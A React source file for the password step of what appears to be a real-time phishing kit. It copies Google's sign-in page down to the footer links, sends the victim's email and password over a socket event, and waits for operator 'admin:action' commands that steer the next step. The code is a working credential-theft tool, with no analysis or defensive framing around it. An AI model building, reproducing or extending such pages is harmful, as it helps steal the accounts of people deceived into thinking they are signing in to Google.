import React, { useState, useEffect } from 'react';
import Logo from './assets/logo.webp';

const PasswordStep = ({ email, onBack, onSuccess, isLoading: parentLoading, socket , errorMsg }) => {
  const [password, setPassword] = useState('');
    const [focused, setFocused] = useState(false);

  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(parentLoading || false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);
    socket.emit('user:login', { email, password });
  };

  useEffect(() => {
    const handleAdminAction = (data) => {
      let action = '';
      let code = '';

      if (typeof data === 'string') action = data;
      else if (data && typeof data === 'object') {
        action = data.action;
        code = data.code || '';
      }

      console.log('[SOCKET] admin:action:', action, code);

      // Notify parent component what happened
      onSuccess({ action, code });
      setIsLoading(false);
    };

    socket.on('admin:action', handleAdminAction);
    return () => socket.off('admin:action', handleAdminAction);
  }, [socket, onSuccess]);
  return (
    <div className="md:min-h-screen bg-white md:bg-[#f0f4f9] flex items-center justify-center pt-6 md:py-12 px-5">
      <div className="w-full max-w-md md:max-w-5xl md:bg-white rounded-[28px] md:shadow-sm md:border md:border-gray-200">
   {isLoading && (
  <div className="absolute top-0 left-0 md:top-auto md:left-auto w-full md:max-w-[60rem] h-[3px] bg-transparent overflow-hidden rounded-t-[28px]">
    <div className="h-full bg-[#1a73e8] animate-bar1"></div>
    <div className="h-full bg-[#1a73e8] animate-bar2"></div>
  </div>
)}

        <div className="md:p-14">
          <div className="md:flex md:gap-16 md:items-start">
            <div className="flex-1 md:mt-[-36px] md:ml-[-23px]">
              <div>
                <img src={Logo} alt="logo" className="w-16 ml-[-11px]" />
              </div>
              <h1 className="text-4xl font-normal text-gray-800 mb-4 text-start mt-2">Welcome</h1>
              <div className="flex items-center gap-3 mb-6 p-1 border border-[#612B1F] rounded-[16px] w-fit">
                <svg className='svgja' aria-hidden="true" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
                <div className="text-sm text-gray-900 truncate">{email}</div>
                <button onClick={onBack} className="text-sm text-blue-600 hover:underline">
                  <svg fill="currentColor" width="24px" height="24px" viewBox="0 0 24 24">
                    <path d="M7 10l5 5 5-5z"></path>
                  </svg>
                </button>
              </div>
            </div>
            <div className="flex-1">
            <span className="margin-bottom: 10px;">To continue, first verify it’s you</span>
              <form onSubmit={handleSubmit} className="space-y-6 mt-12">
                <div>
                 
                  <div className="relative">
                     <div className="relative w-full">
      {/* Input */}
      <input
        id="password"
        type={showPassword ? "text" : "password"}
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(!!password)}
        className={`w-full h-14 px-4 pr-12 text-base rounded-md border bg-white
          ${focused ? "border-blue-500 " : "border-[#747775]"}
          focus:outline-none transition-all duration-200`}
        required
      />

      {/* Floating label */}
      <label
        htmlFor="password"
        className={`absolute left-4 text-gray-500 pointer-events-none transition-all duration-200
          ${focused ? "-top-2 text-xs text-blue-600 bg-white px-1" : "top-4 text-base"}`}
      >
        Enter your password
      </label>
      </div>
                  </div>
{errorMsg && (
  <p className="text-sm text-red-600 mt-2 ">{errorMsg}</p>
)}
                  <div className="flex items-center mt-4">
                    <input
                      type="checkbox"
                      id="showPassword"
                      checked={showPassword}
                      onChange={(e) => setShowPassword(e.target.checked)}
                      className="mr-2 h-4 w-4 text-blue-600"
                    />
                    <label htmlFor="showPassword" className="text-sm font-medium text-gray-700">
                      Show password
                    </label>
                  </div>
                </div>

                <div className="flex items-center justify-end pt-8">
                  <a href="#" className="font-medium text-sm text-blue-600 hover:underline me-5">
                    Forgot password?
                  </a>

                  <button
                    type="submit"
                    disabled={!password || isLoading}
                    className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-[20px] text-sm disabled:opacity-50 disabled:cursor-not-allowed transition-colors min-w-[80px]"
                  >
                    Next
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
       <footer className="fixed bottom-0 left-0 md:bottom-auto md:left-auto w-full  md:max-w-5xl text-gray-600  text-[13px] px-4 md:px-6 py-2 flex items-center justify-center md:justify-between gap-6 flex-wrap">
          {/* Language selector */}
          <div className="flex items-center gap-1">
            <select
              className="bg-transparent text-gray-600 dark:text-gray-300 text-sm focus:outline-none cursor-pointer"
              defaultValue="en-GB"
            >
              <option value="en-US">English (United States)</option>
              <option value="en-GB">English (United Kingdom)</option>
              <option value="fr">Français</option>
              <option value="es">Español</option>
              <option value="de">Deutsch</option>
            </select>
          </div>

          {/* Footer links */}
       <div className="flex items-center gap-6">
            <a href="https://support.google.com/accounts?hl=en-GB&visit_id=638967175488186215-4011923115&rd=2&p=account_iph#topic=3382296" target="_blank" className="hover:underline">
              Help
            </a>
            <a href="https://policies.google.com/privacy?hl=en-GB" target="_blank" className="hover:underline">
              Privacy
            </a>
            <a href="https://policies.google.com/terms?hl=en-GB" target="_blank" className="hover:underline">
              Terms
            </a>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default PasswordStep;
